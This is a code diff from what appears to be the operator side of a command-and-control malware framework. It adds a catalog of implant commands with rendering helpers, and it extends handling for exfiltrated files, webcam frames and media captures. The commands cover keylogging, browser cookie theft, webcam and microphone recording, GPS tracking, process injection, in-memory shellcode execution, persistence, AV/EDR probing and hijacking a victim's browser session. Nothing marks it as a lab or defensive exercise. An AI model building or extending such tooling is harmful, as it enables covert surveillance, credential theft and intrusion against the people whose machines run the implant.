@@ -10,34 +10,138 @@ from datetime import datetime
 from phantom.utils.paths import data_dir
 
 
-BEACON_COMMANDS = """
-[bold]Recon:[/]      recon, ls/dir, drives, find, sysinfo, netinfo, processes, pwd, cd, cat, whoami
-[bold]Netstat:[/]    netstat, netstat-json
-[bold]Transfer:[/]   download <path>  |  upload <path> <base64>
-[bold]Portfwd:[/]    portfwd <local> <remote_host> <remote_port>  |  portfwd-stop
-[bold]SOCKS5:[/]     socks <local_port>  |  socks-stop  [dim](Windows only)[/]
-[bold]SMB Pipe:[/]   smb-pipe [name]  |  smb-pipe-stop  [dim](Windows only)[/]
-[bold]Browser:[/]    browser-pivot <local_port> [pid]  |  browser-pivot-stop  |  browser-list  [dim](Windows only)[/]
-[bold]CDP:[/]        cdp-launch, cdp-cookies, cdp-eval, cdp-nav, cdp-fetch  [dim](Windows only)[/]
-[bold]Keylog:[/]     keylog start|stop|status|dump [filter]  [dim](Windows only)[/]
-[bold]Screenshot:[/] screenshot  [dim](Windows only)[/]
-[bold]Cookies:[/]    cookies, cookies-json  [dim](Chrome DPAPI)[/]
-[bold]WiFi/BT:[/]    wlan-scan, wlan-locate, bt-scan, bt-scan-json
-[bold]Injection:[/]  inject <pid> [dim](new beacon in PID, original stays — 2 beacons)[/dim] | migrate [dim](hollow new process, original exits — 1 beacon)[/dim] | mem-run <b64> [dim](Windows only)[/dim]
-[bold]Persistence:[/] autopersist  [dim](Auto-detect)[/]
-[bold]Shell:[/]      shell <cmd>  |  any OS command
-[bold]Config:[/]     sleep <ms>  |  exit/kill
-"""
+# Structured beacon command catalog: (command, description, platform).
+# platform: "" = all platforms, "win" = Windows-only, "linux" = Linux-only.
+# Single source of truth for the C2 shell `beacon-help`, the API endpoint,
+# and the Electron command palette/autocomplete.
+BEACON_COMMAND_LIST: list[tuple[str, str, str]] = [
+    # ── recon / filesystem ──
+    ("recon", "Full recon sweep (sysinfo + netinfo + processes)", ""),
+    ("sysinfo", "OS, user, arch, hostname, uptime", ""),
+    ("netinfo", "Network interfaces, IPs, MAC addresses", ""),
+    ("processes", "Running process list with PIDs", ""),
+    ("ls <path>", "List directory (alias: dir)", ""),
+    ("pwd", "Print working directory", ""),
+    ("cd <path>", "Change directory (cd.. supported)", ""),
+    ("cat <file>", "Read a text file", ""),
+    ("find <pattern>", "Find files matching a pattern", ""),
+    ("drives", "List drives/volumes", ""),
+    ("whoami", "Current user context", ""),
+    # ── transfer ──
+    ("download <path>", "Exfiltrate a file to the C2", ""),
+    ("upload <path> <b64>", "Push a file onto the target", ""),
+    # ── network ──
+    ("netstat", "Active TCP/UDP connections table", ""),
+    ("netstat-json", "Connections as JSON", ""),
+    ("portfwd <l> <host> <p>", "TCP port-forward through the beacon", ""),
+    ("portfwd-stop", "Stop all port forwards", ""),
+    ("socks <port>", "SOCKS5 proxy through the beacon", "win"),
+    ("socks-stop", "Stop the SOCKS5 proxy", "win"),
+    ("smb-pipe [name]", "Named-pipe SMB channel", "win"),
+    ("smb-pipe-stop", "Stop the SMB pipe channel", "win"),
+    # ── browser / CDP ──
+    ("browser-pivot <port> [pid]", "Pivot into a browser via CDP", "win"),
+    ("browser-pivot-stop", "Stop the browser pivot", "win"),
+    ("browser-list", "List running browsers + debug ports", "win"),
+    ("cdp-launch", "Launch a CDP-pivotable browser", "win"),
+    ("cdp-cookies", "Dump cookies via CDP", "win"),
+    ("cdp-eval <js>", "Evaluate JS in the pivoted browser", "win"),
+    ("cdp-nav <url>", "Navigate the pivoted browser", "win"),
+    ("cdp-fetch <url>", "Fetch a URL with the victim's session", "win"),
+    # ── collection ──
+    ("keylog start|stop|status|dump", "Keystroke logger (dump = retrieve buffer)", "win"),
+    ("screenshot", "Capture the screen (BMP artifact)", ""),
+    ("cookies", "Extract browser cookies (DPAPI)", "win"),
+    ("cookies-json", "Cookies as JSON", "win"),
+    ("camera", "Capture a webcam frame (JPEG artifact)", ""),
+    ("audio <sec>", "Record microphone audio (WAV artifact)", ""),
+    ("screen-record <sec>", "Record the screen (JPEG frames)", ""),
+    ("screen-record-live <sec>", "Live screen recording session", "win"),
+    ("screen-dump", "Dump frames of the live recording", "win"),
+    # ── location / wireless ──
+    ("gps", "Real GPS position (WinRT) + WiFi fallback", ""),
+    ("wlan-scan", "Nearby WiFi access points (BSSID/RSSI)", ""),
+    ("wlan-locate", "WiFi geolocation (Apple WLOC, no key)", ""),
+    ("bt-scan", "Nearby Bluetooth devices", ""),
+    ("bt-scan-json", "Bluetooth devices as JSON", ""),
+    # ── injection / persistence ──
+    ("inject <pid>", "New beacon inside an existing process", ""),
+    ("inject-eb <pid>", "Early-bird injection variant", "win"),
+    ("inject-tl <pid>", "Threadless APC injection variant", "win"),
+    ("migrate", "Hollow a fresh process, move beacon", ""),
+    ("mem-run <b64>", "Run base64 shellcode in-memory", "win"),
+    ("persist [method]", "Install persistence (runkey/systemd/cron)", ""),
+    ("autopersist", "Auto-detect OS and install persistence", ""),
+    # ── shell / config ──
+    ("shell <cmd>", "Execute an OS command (bare command works too)", ""),
+    ("sleep <ms>", "Set the check-in cadence", ""),
+    ("set-sleep <ms> [jitter%]", "Cadence + jitter, mid-session", ""),
+    ("auth-rotate <b64-secret>", "Rotate this beacon's HMAC identity", ""),
+    ("health", "Self-report: uptime, check-ins, cadence, errors", ""),
+    ("edrcheck", "Probe loaded AV/EDR drivers", "win"),
+    ("exit | kill", "Shut the beacon down", ""),
+]
+
+
+def beacon_command_dicts() -> list[dict]:
+    """JSON-ready command list for the API / Electron palette."""
+    return [
+        {"command": c, "description": d, "platform": p}
+        for c, d, p in BEACON_COMMAND_LIST
+    ]
+
+
+def _render_beacon_commands() -> str:
+    """Rich-formatted panel body for the CLI `beacon-help`."""
+    groups: dict[str, list[str]] = {}
+    for c, d, p in BEACON_COMMAND_LIST:
+        section = {
+            "recon / filesystem": ("recon", "sysinfo", "netinfo", "processes",
+                                   "ls", "pwd", "cd", "cat", "find", "drives", "whoami"),
+            "transfer": ("download", "upload"),
+            "network": ("netstat", "portfwd", "socks", "smb-pipe"),
+            "browser / CDP": ("browser", "cdp"),
+            "collection": ("keylog", "screenshot", "cookies", "camera", "audio",
+                           "screen-record", "screen-dump"),
+            "location / wireless": ("gps", "wlan", "bt-scan"),
+            "injection / persistence": ("inject", "migrate", "mem-run", "persist", "autopersist"),
+            "shell / config": ("shell", "sleep", "set-sleep", "auth-rotate",
+                               "health", "edrcheck", "exit"),
+        }
+        hit = next((name for name, prefixes in section.items()
+                    if c.startswith(prefixes)), None)
+        groups.setdefault(hit or "other", []).append(
+            f"[cyan]{c}[/] — {d}" + (f" [dim]({p})[/]" if p else ""))
+    lines = []
+    for name, cmds in groups.items():
+        lines.append(f"[bold]{name}:[/]")
+        lines.extend(f"  {c}" for c in cmds)
+    return "\n".join(lines)
+
+
+BEACON_COMMANDS = _render_beacon_commands()
 
 
 def save_beacon_download(b64_data: str, suggested_name: str = "") -> str:
-    """Decode base64 file data from beacon and save to data/downloads/."""
+    """Decode base64 file data from beacon and save to data/downloads/.
+    The real format is sniffed from magic bytes so a JPEG camera frame is
+    never stored as .bmp (Electron renders it by extension)."""
     out_dir = os.path.join(data_dir(), "downloads")
     os.makedirs(out_dir, exist_ok=True)
-    name = suggested_name or f"beacon_{datetime.now().strftime('%Y%m%d_%H%M%S')}.bin"
-    name = os.path.basename(name.replace("\\", "/"))
-    path = os.path.join(out_dir, name)
     data = base64.b64decode(b64_data)
+    real_ext = ""
+    if data[:3] == b"\xff\xd8\xff":
+        real_ext = ".jpg"
+    elif data[:8] == b"\x89PNG\r\n\x1a\n":
+        real_ext = ".png"
+    elif data[:2] == b"BM":
+        real_ext = ".bmp"
+    elif data[:4] == b"GIF8":
+        real_ext = ".gif"
+    base = os.path.splitext(os.path.basename(suggested_name or ""))[0] \
+        or f"beacon_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
+    name = base.replace("\\", "_") + (real_ext or ".bin")
+    path = os.path.join(out_dir, name)
     with open(path, "wb") as f:
         f.write(data)
     return path
@@ -216,6 +320,33 @@ def format_beacon_output(output: str) -> tuple[str, str]:
         except json.JSONDecodeError:
             display = raw
         return display, ""
+
+    if output.startswith("CAM_FRAME:"):
+        # camera capture: "CAM_FRAME:<device>|MEDIA_B64:<b64>" — save as a
+        # real image artifact the operator can open
+        raw = output[len("CAM_FRAME:"):]
+        device, _, b64 = raw.partition("|")
+        if b64.startswith("MEDIA_B64:"):
+            b64 = b64[len("MEDIA_B64:"):]
+        try:
+            path = save_beacon_download(
+                b64, suggested_name=f"camera_{datetime.now().strftime('%H%M%S')}.bmp")
+            size = os.path.getsize(path)
+            return f"[Camera frame captured — {size} bytes — device: {device or '?'}]", \
+                   f"Saved to: {path}"
+        except Exception as e:
+            return f"[Camera decode failed: {e}]", ""
+
+    if output.startswith("MEDIA_B64:"):
+        # generic media artifact (audio WAV, screen-record frames, GPS photo…)
+        try:
+            path = save_beacon_download(
+                output[len("MEDIA_B64:"):],
+                suggested_name=f"media_{datetime.now().strftime('%H%M%S')}.bin")
+            size = os.path.getsize(path)
+            return f"[Media artifact saved — {size} bytes]", f"Saved to: {path}"
+        except Exception as e:
+            return f"[Media decode failed: {e}]", ""
 
     if output.startswith("FILE_B64:"):
         try:
